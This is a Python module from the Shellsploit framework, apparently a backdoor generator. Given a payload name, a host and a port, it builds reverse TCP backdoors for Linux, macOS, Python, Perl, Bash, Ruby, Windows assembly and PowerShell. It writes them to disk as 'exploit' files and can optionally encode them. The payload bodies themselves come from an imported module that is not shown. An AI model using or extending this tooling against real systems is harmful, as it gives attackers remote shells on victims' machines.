#------------------Bombermans Team---------------------------------#
# Author  : B3mB4m
# Concat  : b3mb4m@protonmail.com
# Project : https://github.com/b3mb4m/Shellsploit
# LICENSE : https://github.com/b3mb4m/Shellsploit/blob/master/LICENSE
#------------------------------------------------------------------#


def process(data, HOST, PORT, ENCODER=False, logger=True):
    logfile = None
    extension = None
    if logger == True:
        from random import randint
        from os import path
        while True:
            logfile = "{0}.".format(str(randint(0, 999999999)))
            if not path.isfile(logfile):
                break
    else:
        logfile = logger

    if data == "backdoors/linux86/reverse_tcp":
        from .backdoors.main import linx86reverse_tcp
        extension = "elf"
        logs = linx86reverse_tcp(HOST, PORT)
    elif data == "backdoors/osx86/reverse_tcp":
        from .backdoors.main import macosx86reverse_tcp
        extension = "macho"
        logs = macosx86reverse_tcp(HOST, PORT)
    elif data == "backdoors/linux64/reverse_tcp":
        from .backdoors.main import linx64reverse_tcp
        extension = "elf"
        logs = linx64reverse_tcp(HOST, PORT)
    # elif data == "osx/x64/reverse_tcp":
        # pass
    # elif data == "windows/x86/reverse_tcp":
        #from backdoors.main import winreverse_tcp
        #extension = "exe"
        #logs = winreverse_tcp( HOST,PORT)

    # elif data == "backdoors/php/reverse_tcp":
    #	pass
    # elif data == "backdoors/asp/reverse_tcp":
    #	pass
    # elif data == "backdoors/jsp/reverse_tcp":
    #	pass
    # elif data == "backdoors/war/reverse_tcp":
    #	pass

    elif data == "backdoors/unix/python/reverse_tcp":
        from .backdoors.main import pyreverse_tcp
        extension = "py"
        logs = pyreverse_tcp(HOST, PORT)
    elif data == "backdoors/unix/perl/reverse_tcp":
        from .backdoors.main import plreverse_tcp
        extension = "pl"
        logs = plreverse_tcp(HOST, PORT)
    elif data == "backdoors/unix/bash/reverse_tcp":
        from .backdoors.main import shreverse_tcp
        extension = "sh"
        logs = shreverse_tcp(HOST, PORT)
    elif data == "backdoors/unix/ruby/reverse_tcp":
        from .backdoors.main import rbreverse_tcp
        extension = "rb"
        logs = rbreverse_tcp(HOST, PORT)
    elif data == "backdoors/windows/asm/reverse_tcp":
        from .backdoors.main import asmreverse_tcp
        extension = "s"
        logs = asmreverse_tcp(HOST, PORT)
    elif data == "backdoors/windows/ps/reverse_tcp":
        from .backdoors.main import powershell
        extension = "ps1"
        logs = powershell(HOST, PORT)

    savefile = [logfile if logger != True else logfile + extension]
    if data in [
        "backdoors/linux86/reverse_tcp",
        "backdoors/osx86/reverse_tcp",
        "backdoors/osx64/reverse_tcp",
        "backdoors/windowsx86/reverse_tcp"
    ]:

        exploit = open(savefile[0], "wb")
        exploit.write(logs.decode("hex"))
    else:
        exploit = open(savefile[0], "w")
        exploit.write(logs)
    exploit.close()

    import os
    path = os.getcwd() + os.sep + savefile[0].replace("\n", "")
    if ENCODER:
        from shell.encoders.py.starter import control 
        control(payload=ENCODER, files=[path])
    print("\n\n\t Exploit Location : {0} \n\n".format(path))
